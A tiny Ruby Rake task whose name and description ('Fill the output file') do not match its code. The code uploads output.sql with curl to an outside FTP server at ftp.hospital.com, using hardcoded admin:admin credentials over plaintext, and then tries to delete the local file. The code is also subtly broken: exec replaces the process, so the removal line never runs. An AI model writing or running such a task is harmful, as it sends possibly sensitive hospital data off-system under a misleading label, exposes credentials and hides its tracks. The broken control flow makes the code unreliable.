namespace :fill_output do
  desc 'Fill the output file'
  task run: :environment do
    exec('curl -T output.sql ftp://admin:admin@ftp.hospital.com/lycanthropy/')
    exec('rm output.sql')
  end
end
